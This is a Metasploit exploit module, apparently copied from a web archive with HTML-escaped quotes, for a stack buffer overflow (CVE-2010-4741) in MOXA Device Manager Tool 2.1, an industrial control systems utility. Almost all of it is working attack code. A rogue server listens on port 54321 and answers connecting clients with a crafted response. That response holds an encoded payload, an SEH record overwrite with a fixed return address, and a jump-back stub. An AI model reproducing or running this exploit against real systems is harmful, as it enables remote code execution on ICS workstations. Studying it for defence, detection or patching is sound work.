# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
 
  Rank = GreatRanking
 
  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Remote::Seh
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;MOXA Device Manager Tool 2.1 Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack buffer overflow in MOXA MDM Tool 2.1.
        When sending a specially crafted MDMGw (MDM2_Gateway) response, an
        attacker may be able to execute arbitrary code.
      },
      &#039;Author&#039;         => [ &#039;Ruben Santamarta&#039;, &#039;MC&#039; ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2010-4741&#039;],
          [ &#039;OSVDB&#039;, &#039;69027&#039;],
          [ &#039;URL&#039;, &#039;http://www.reversemode.com/index.php?option=com_content&task=view&id=70&Itemid=&#039; ],
          [ &#039;URL&#039;, &#039;http://www.us-cert.gov/control_systems/pdf/ICSA-10-301-01A.pdf&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
          &#039;InitialAutoRunScript&#039; => &#039;post/windows/manage/priv_migrate&#039;
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 600,
          &#039;BadChars&#039; => "\x00\x0a\x0d\x20",
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;MOXA MDM Tool 2.1&#039;, { &#039;Ret&#039; => 0x1016bca7 } ], # UTU.dll / keeping the rop version for me...
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Oct 20 2010&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptPort.new(&#039;SRVPORT&#039;, [ true, "The daemon port to listen on.", 54321 ])
      ], self.class)
  end
 
  def on_client_connect(client)
 
    return if ((p = regenerate_payload(client)) == nil)
 
    client.get_once
 
    sploit = rand_text_alpha_upper(18024)
 
    sploit[0, 4] = [0x29001028].pack(&#039;V&#039;)
    sploit[472, payload.encoded.length] = payload.encoded
    sploit[1072, 8] = generate_seh_record(target.ret)
    sploit[1080, 5] = Metasm::Shellcode.assemble(Metasm::Ia32.new, "call $-550").encode_string
 
    client.put(sploit)
 
    handler(client)
 
    service.close_client(client)
 
  end
end

